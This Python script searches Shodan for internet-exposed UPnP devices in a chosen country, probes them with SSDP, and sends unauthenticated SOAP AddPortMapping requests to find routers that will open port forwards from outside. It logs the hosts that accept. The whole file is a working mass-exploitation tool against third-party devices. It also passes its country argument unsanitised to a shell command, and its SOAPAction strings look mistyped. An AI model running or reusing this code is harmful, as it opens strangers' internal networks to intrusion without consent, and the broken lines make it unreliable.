#!/usr/bin/env python3

import os
import re
import socket
import requests
from bs4 import BeautifulSoup
from argparse import ArgumentParser


def get_arguments():
    parser = ArgumentParser()
    parser.add_argument('-i', '--input', type=str, help='File with target hosts for scanning')
    parser.add_argument('-c', '--country', type=str, help='Country to scan')
    parser.add_argument('-o', '--output', type=str, help='File with urls to xml configurations')
    args = parser.parse_args()
    return args

def get_vuln_ips(country):
    os.system(f'''shodan download --limit 100 {country} "port:1900 country:{country}"''')
    os.system(f"shodan parse {country}.json.gz --fields ip_str > {country}.txt")
    
def get_ips_from_file(hostsFile):
    with open(hostsFile, "r", encoding="utf-8") as file:
        return [line.strip() for line in file]

def port_forwarding(outputFile):
    with open(outputFile, "r", encoding="utf-8") as file:
        for line in file:
            ip = line.strip().split(':')[0]
            port = line.strip().split(':')[1].split('/')[0]
            ip_with_port = ip + ':' + port

            try:
                soup = BeautifulSoup(requests.get("http://" + line.strip()).text, 'lxml')
                controlurl = soup.find('devicelist').find('devicelist').find('controlurl').get_text()
                localip = soup.find('presentationurl').get_text()[7:18]
                soapAddActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
                     'Content-type' : 'text/xml; charset="utf-8"',
                     'Connection' : 'close' }

                soapDeleteActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#DeletePortMapping' + '"',
                         'Content-type' : 'text/xml; charset="utf-8"',
                         'Connection' : 'close' }

                payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
                           '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
                           '<s:Body>' +
                           '<u:AddPortMapping xmlns:u="' + "urn:schemas-upnp-org:services:WANIPConnection:1" + '">' +
                           '<NewRemoteHost></NewRemoteHost>' +
                           '<NewExternalPort>5555</NewExternalPort>' +
                           f"<NewInternalClient>{localip}</NewInternalClient>" +
                           '<NewInternalPort>80</NewInternalPort>'+
                           '<NewProtocol>TCP</NewProtocol>' +
                           '<NewPortMappingDescription>test</NewPortMappingDescription>' +
                           '<NewLeaseDuration>10</NewLeaseDuration>' +
                           '<NewEnabled>1</NewEnabled>' +
                           '</u:AddPortMapping>' +
                           '</s:Body>' +
                           '</s:Envelope>')

                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
                    data=payload, headers=soapAddActionHeader)

                if resp.status_code != 200:
                    print('[-] ' + ip + ' is not vulnerable for port forwarding')
                else:
                    print('[+] ' + ip + ' is vulnerable for port forwarding')
                    with open('output.txt', "a", encoding="utf-8") as f:
                        f.write(ip + '\n')

                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
                    data=payload, headers=soapDeleteActionHeader)
            except Exception as e:
                continue
    print('\u001b[36m' + '---------------------------\n' + 'see output.txt file to see hosts vulnerable for port forwarding\n' \
         +'---------------------------')

def discover_upnp_locations(hostsFile, output):
    location_regex = re.compile("location:[ ]*(.+)\r\n", re.IGNORECASE)
    port_and_xml_regex = re.compile(":\d{1,5}/.{1,25}", re.IGNORECASE)
    ssdpDiscover = ('M-SEARCH * HTTP/1.1\r\n' +
                    'HOST: 239.255.255.250:1900\r\n' +
                    'MAN: "ssdp:discover"\r\n' +
                    'MX: 5\r\n' +
                    'ST: upnp:rootdevice\r\n' +
                    'ST: ssdp:all\r\n' +
                    '\r\n')

    hosts = get_ips_from_file(hostsFile)
    for host in hosts:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ssdpDiscover.encode('ASCII'), (host, 1900))
            sock.settimeout(0.2)
            data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
            location_result = location_regex.search(data.decode('ASCII'))
            if location_result == None or \
                port_and_xml_regex.search(location_result.group(1)) == None:
                print(host + ' : ' + 'no location')
                continue

            fullUrl = host + port_and_xml_regex.search(location_result.group(1)).group(0)
            soup = BeautifulSoup(requests.get("http://" + fullUrl.strip(), timeout=0.2).text, 'lxml')
            print(fullUrl + ' : ' + 'vulnerable')
            with open(output, "a", encoding="utf-8") as f:
                f.write(fullUrl + '\n')
        except:
            print(host + ' : ' + 'not accessible')
            continue

def main():
    args = get_arguments()
    if args.input == None and args.country == None:
        print("Specify the country for scanning, or a file with hosts")
        exit(0)
    elif args.input == None and args.country != None:
        if args.output == None:
            print("Specify a file to record scan results")
            exit(0)
        get_vuln_ips(args.country)
        print('---------------------------\n' + 'Discovering upnp locations\r\n' +'---------------------------')
        discover_upnp_locations(args.country + '.txt', args.output)
        print('---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
        port_forwarding(args.output)
        print('see ' + args.output + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
    elif args.input != None:
        if args.output == None:
            print("Specify a file to record scan results")
            exit(0)
        print('\033[92m' + '---------------------------\n' + 'Discovering upnp locations\r\n' +'---------------------------')
        discover_upnp_locations(args.input, args.output)
        print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
        port_forwarding(args.output)
        print('\u001b[33m' + '---------------------------\n' + 'see ' + args.output + ' file to see hosts with open xml configurations\r\n' +'---------------------------')


if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print('Sudo required')
    except KeyboardInterrupt:
        print('[-] Interrupted')
